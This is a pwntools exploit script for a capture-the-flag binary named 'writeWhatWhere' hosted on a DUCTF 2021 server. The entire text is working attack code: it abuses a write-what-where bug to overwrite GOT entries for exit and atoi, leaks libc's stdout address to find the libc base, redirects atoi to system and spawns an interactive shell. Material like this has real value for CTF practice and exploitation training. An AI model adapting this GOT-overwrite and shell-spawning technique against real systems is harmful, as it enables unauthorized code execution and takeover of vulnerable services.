from pwn import *
#io = process("./writeWhatWhere",aslr=True)
io = remote("pwn-2021.duc.tf",31920)
libc = ELF("./libc.so.6")

exitGot = 0x404038
atoiGot = 0x404030
stdout = 0x404050
mainB4Puts = p32(0x4011d1) #mov rdi,rax; call puts
main = p32(0x4011a9)

def overwrite(addr,what):
    io.sendafter("what?",what)
    io.sendlineafter("where?",str(addr))

overwrite(exitGot,mainB4Puts)
overwrite(stdout - 4,"AAAA")

io.recv()
stdoutLibc = u64(io.recvuntil("\n")[4:-1].ljust(8,b"\x00"))
libc.address = stdoutLibc - 1971904 #stdout@GLIBC_2.2.5 offset
system = p64(libc.symbols["system"])

log.info("stdout@GLIBC_2.2.5: " + hex(stdoutLibc))
log.info("Libc Base: " + hex(libc.address))

overwrite(exitGot,main) #To get rid of movaps issue using the push at the beginning of main
overwrite(atoiGot,system[:4])

io.sendlineafter("what?","1")
io.sendlineafter("where?","sh")

io.interactive()
